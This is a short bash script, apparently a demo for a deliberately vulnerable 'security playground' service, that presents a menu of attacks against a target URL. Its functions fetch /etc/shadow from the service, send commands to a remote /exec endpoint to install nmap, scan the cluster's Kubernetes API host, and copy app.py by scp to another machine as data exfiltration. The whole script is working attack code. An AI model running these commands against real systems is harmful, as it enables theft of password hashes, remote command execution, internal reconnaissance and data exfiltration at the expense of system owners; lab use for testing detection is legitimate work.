#!/bin/bash

read -p "What is the http address of your target? [http://192.168.1.56]: "  sec_playground_url
sec_playground_url=${sec_playground_url:-http://192.168.1.56}

function read_sensitive_file() {
    echo ""
	echo "Reading /etc/shadow from remote service... "
	curl ${sec_playground_url}/etc/shadow
	echo ""
}

function install_nmap() {
    echo ""
	echo "Installing nmap in remote contianer... "
    echo ""
	curl -X POST ${sec_playground_url}/exec -d 'command=apt-get update; apt-get -y install nmap'
    echo ""
}

function port_scan() {
    echo ""
	echo "Run Port Scan... "
    echo ""
	curl -X POST ${sec_playground_url}/exec -d 'command=nmap kubernetes.default.svc.cluster.local'
    echo ""
}

function exfiltrate_data() {
    echo ""
	echo "Exfiltrate Data... "
	echo ""
    curl -X POST ${sec_playground_url}/exec -d 'command=scp -r app.py test@192.168.1.51:/tmp/app.py'
    echo ""
}


menu(){
echo -ne "
Select an Exploit:
1) Read Sensitive File
2) Install NMAP
3) Run Port Scan
4) Exfiltrate Data
5) Exit
Choose an option: "
        read a
        case $a in
	        1) read_sensitive_file ; menu ;;
	        2) install_nmap ; menu ;;
	        3) port_scan ; menu ;;
	        4) exfiltrate_data ; menu ;;
		0) exit 0 ;;
        esac
}

# Call the menu function
menu
